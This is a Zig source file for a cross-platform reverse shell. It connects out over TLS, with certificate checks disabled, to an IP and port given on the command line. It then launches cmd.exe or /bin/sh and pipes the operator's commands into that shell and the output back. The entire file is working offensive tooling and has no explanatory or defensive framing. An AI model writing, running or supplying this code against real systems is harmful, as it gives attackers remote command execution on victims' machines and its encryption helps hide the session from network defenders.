const std = @import("std");
const builtin = @import("builtin");

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(std.heap.page_allocator);
    defer std.process.argsFree(std.heap.page_allocator, args);
    if (args.len != 3) {
        std.debug.print("Usage: {s} <IP> <PORT>\n", .{args[0]});
        return;
    }

    const target_hostname = args[1];
    const target_port_str = args[2];

    const target_port = std.fmt.parseInt(u16, target_port_str, 10) catch |err| {
        std.debug.print("Error parsing port '{s}': {}\n", .{ target_port_str, err });
        return;
    };

    var shell: []const []const u8 = undefined;

    if (builtin.os.tag == .windows) {
        shell = &[_][]const u8{"cmd.exe"};
        std.debug.print("[+] Using cmd.exe as the shell\n", .{});
    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
        shell = &[_][]const u8{"/bin/sh"};
        std.debug.print("[+] Using /bin/sh as the shell\n", .{});
    } else {
        std.debug.print("[-] Cannot detect target OS\n", .{});
        return;
    }

    std.debug.print("[+] Connecting to {s}:{d}\n", .{ target_hostname, target_port });

    const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
    defer address_list.deinit();
    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
        std.debug.print("[-] Host seems down. Cannot connect to the host.\n", .{});
        return;
    };
    defer stream.close();

    // Create empty certificate bundle for no verification
    var ca_bundle = std.crypto.Certificate.Bundle{};
    defer ca_bundle.deinit(allocator);

    // Initialize TLS client with both required fields
    var tls_client = std.crypto.tls.Client.init(stream, .{
        .host = .no_verification,
        .ca = ca_bundle,
    }) catch |err| {
        std.debug.print("[-] TLS initialization failed: {}\n", .{err});
        return;
    };

    std.debug.print("[+] TLS connection established\n", .{});

    var process = std.process.Child.init(shell, allocator);
    process.stdin_behavior = .Pipe;
    process.stdout_behavior = .Pipe;
    process.stderr_behavior = .Pipe;
    try process.spawn();
    defer _ = process.kill() catch {};

    var buffer: [4096]u8 = undefined;

    while (true) {
        // Read command from TLS socket
        const bytes_read = tls_client.read(stream, &buffer) catch break;
        if (bytes_read == 0) break;

        // Send command to process
        _ = process.stdin.?.write(buffer[0..bytes_read]) catch break;

        // Wait for execution
        std.time.sleep(300 * std.time.ns_per_ms);

        // Read output once with reasonable timeout
        if (process.stdout.?.read(&buffer)) |output_len| {
            if (output_len > 0) {
                _ = tls_client.writeAll(stream, buffer[0..output_len]) catch break;
            }
        } else |_| {
            // If stdout fails, try stderr
            if (process.stderr.?.read(&buffer)) |error_len| {
                if (error_len > 0) {
                    _ = tls_client.writeAll(stream, buffer[0..error_len]) catch break;
                }
            } else |_| {}
        }
    }

    std.debug.print("[+] Session ended\n", .{});
}
